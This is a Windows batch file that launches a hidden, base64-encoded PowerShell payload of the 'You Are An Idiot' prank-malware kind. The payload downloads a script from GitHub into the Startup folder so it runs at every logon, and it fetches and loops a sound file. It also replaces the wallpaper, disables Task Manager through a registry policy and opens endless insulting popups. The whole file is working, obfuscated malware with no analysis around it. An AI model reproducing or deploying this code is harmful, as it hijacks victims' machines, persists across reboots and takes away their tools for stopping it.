@echo off
if not "%minimized%"=="" goto :minimized
set minimized=true
start /min cmd /C "%~dpnx0"
goto :EOF
:minimized
powershell -W hidden -enc ZgB1AG4AYwB0AGkAbwBuACAAbQBlAHMAcwBhAGcAZQAoACQAdgBhAGwAdQBlACkACgAgAHsACgAgACQAdwBzAGMAcgBpAHAAdAAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMAbwBtAE8AYgBqAGUAYwB0ACAAVwBTAGMAcgBpAHAAdAAuAFMAaABlAGwAbAApADsACgAgACQAdwBzAGMAcgBpAHAAdAAuAFAAbwBwAHUAcAAoACIAJAB2AGEAbAB1AGUAIgAsADAALAAiAHcAaQBuAGQAbwB3AHMAIgAsADEANgApACAAfAAgAG8AdQB0AC0AbgB1AGwAbAAKACAAfQAKAAoAZgB1AG4AYwB0AGkAbwBuACAAYQBkAG0AaQBuAAoAIAB7AAoACgAgACQAaQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApAAoAIAAkAHAAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsACgAJABpAGQAKQAKACAAaQBmACAAKAAkAHAALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAEIAdQBpAGwAdABJAG4AUgBvAGwAZQBdADoAOgBBAGQAbQBpAG4AaQBzAHQAcgBhAHQAbwByACkAKQAKACAAewAgAG0AYQBpAG4AIAB9AAoAIABlAGwAcwBlAAoAIAB7ACAAbQBlAHMAcwBhAGcAZQAgAC0AdgBhAGwAdQBlACAAIgBSAHUAbgAgAGEAcwAgAGEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAIgA7ACAAZQB4AGkAdAAgAH0ACgAKACAAfQAKAAoAIABmAHUAbgBjAHQAaQBvAG4AIABzAGUAdAB3AGEAbABsAHAAYQBwAGUAcgAoACQAVgBhAGwAdQBlACkACgAgAHsACgAgACAAIAAgACAAUwBlAHQALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AcABhAHQAaAAgACIASABLAEMAVQA6AFwAQwBvAG4AdAByAG8AbAAgAFAAYQBuAGUAbABcAEQAZQBzAGsAdABvAHAAXAAiACAALQBuAGEAbQBlACAAVwBhAGwAbABQAGEAcABlAHIAIAAtAHYAYQBsAHUAZQAgACQAdgBhAGwAdQBlAAoAIAAgACAAIAAgAHIAdQBuAGQAbABsADMAMgAuAGUAeABlACAAdQBzAGUAcgAzADIALgBkAGwAbAAsACAAVQBwAGQAYQB0AGUAUABlAHIAVQBzAGUAcgBTAHkAcwB0AGUAbQBQAGEAcgBhAG0AZQB0AGUAcgBzAAoAIAB9AAoACgAgAGYAdQBuAGMAdABpAG8AbgAgAG0AYQBpAG4AKAApAAoAIAB7AAoAIAAkAHQAZQBzAHQAeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAgAD0AIABUAGUAcwB0AC0AUABhAHQAaAAgAC0AUABhAHQAaAAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXAB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AYwBtAGQAIgAKACAAaQBmACgAJAB0AGUAcwB0AGMAbQBkACAALQBlAHEAIAAkAGYAYQBsAHMAZQApAAoAIAAgAHsACgAgACAAdwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcABzAHkAYQBiAHUALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC8AbQBhAGkAbgAvAGkAbgBpAHQALgBjAG0AZAAgAC0AbwAgACIAQwA6AFwAVQBzAGUAcgBzAFwAJABlAG4AdgA6AHUAcwBlAHIAbgBhAG0AZQBcAEEAcABwAEQAYQB0AGEAXABSAG8AYQBtAGkAbgBnAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUwB0AGEAcgB0ACAATQBlAG4AdQBcAFAAcgBvAGcAcgBhAG0AcwBcAFMAdABhAHIAdAB1AHAAXAB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AYwBtAGQAIgAKACAAIAB9AAoAIAAkAHQAZQBzAHQAdwBhAHYAIAA9ACAAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgB0AGUAbQBwAC8AeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAHcAYQB2ACIACgAgACAAaQBmACgAJAB0AGUAcwB0AHcAYQB2ACAALQBlAHEAIAAkAGYAYQBsAHMAZQApAAoAIAAgAHsACgAgACAAdwBnAGUAdAAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AcABzAHkAYQBiAHUALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC8AbQBhAGkAbgAvAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALgB3AGEAdgAgAC0AbwAgACIAJABlAG4AdgA6AHQAZQBtAHAALwB5AG8AdQBhAHIAZQBhAG4AaQBkAGkAbwB0AC4AdwBhAHYAIgAKACAAIAB9AAoAIAAkAHQAZQBzAHQAdwBhAGwAbABwAGEAcABlAHIAIAA9ACAAVABlAHMAdAAtAFAAYQB0AGgAIAAtAFAAYQB0AGgAIAAiACQAZQBuAHYAOgB0AGUAbQBwAC8AeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAGoAcABnACIACgAgAGkAZgAoACQAdABlAHMAdAB3AGEAbABsAHAAYQBwAGUAcgAgAC0AZQBxACAAJABmAGEAbABzAGUAKQAKACAAewAKACAAIAB3AGcAZQB0ACAAIgBoAHQAdABwAHMAOgAvAC8AaQAuAGkAbQBnAHUAcgAuAGMAbwBtAC8AUQBqAGIANgBKAHoATwAuAGoAcABnACIAIAAtAG8AIAAiACQAZQBuAHYAOgB0AGUAbQBwAC8AeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAGoAcABnACIACgAgAH0ACgAgACQAcwBvAHUAbgBkAFAAbABhAHkAZQByACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE0AZQBkAGkAYQAuAFMAbwB1AG4AZABQAGwAYQB5AGUAcgAKACAAJABzAG8AdQBuAGQAUABsAGEAeQBlAHIALgBTAG8AdQBuAGQATABvAGMAYQB0AGkAbwBuAD0AIgAkAGUAbgB2ADoAdABlAG0AcABcAHkAbwB1AGEAcgBlAGEAbgBpAGQAaQBvAHQALgB3AGEAdgAiAAoAIAAkAHMAbwB1AG4AZABQAGwAYQB5AGUAcgAuAFAAbABhAHkATABvAG8AcABpAG4AZwAoACkACgAgAHMAZQB0AHcAYQBsAGwAcABhAHAAZQByACAALQB2AGEAbAB1AGUAIAAiACQAZQBuAHYAOgB0AGUAbQBwAC8AeQBvAHUAYQByAGUAYQBuAGkAZABpAG8AdAAuAGoAcABnACIACgAgAE4AZQB3AC0ASQB0AGUAbQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUABvAGwAaQBjAGkAZQBzACIAIAAtAE4AYQBtAGUAIAAiAFMAeQBzAHQAZQBtACIAIAAtAEYAbwByAGMAZQAgAHwAIABvAHUAdAAtAG4AdQBsAGwAIAA7ACAATgBlAHcALQBJAHQAZQBtAFAAcgBvAHAAZQByAHQAeQAgAC0AUABhAHQAaAAgACIASABLAEMAVQA6AFwAUwBvAGYAdAB3AGEAcgBlAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUABvAGwAaQBjAGkAZQBzAFwAUwB5AHMAdABlAG0AIgAgAC0ATgBhAG0AZQAgACIARABpAHMAYQBiAGwAZQBUAGEAcwBrAE0AZwByACIAIAAtAFYAYQBsAHUAZQAgACIAMQAiACAALQBQAHIAbwBwAGUAcgB0AHkAVAB5AHAAZQAgAEQAVwBPAFIARAAgAC0ARgBvAHIAYwBlACAAfAAgAG8AdQB0AC0AbgB1AGwAbAAgADsAIAByAHUAbgBkAGwAbAAzADIALgBlAHgAZQAgAHUAcwBlAHIAMwAyAC4AZABsAGwALAAgAFUAcABkAGEAdABlAFAAZQByAFUAcwBlAHIAUwB5AHMAdABlAG0AUABhAHIAYQBtAGUAdABlAHIAcwAKACAAdwBoAGkAbABlACgAJAB0AHIAdQBlACkACgAgACAAewAKACAAIABtAGUAcwBzAGEAZwBlACAALQB2AGEAbAB1AGUAIAAiACAAWQBvAHUAIABBAHIAZQAgAEEAbgAgAEkAZABpAG8AdAAgAC4AIgAKACAAIAB9AAoACgAgAH0ACgBhAGQAbQBpAG4A
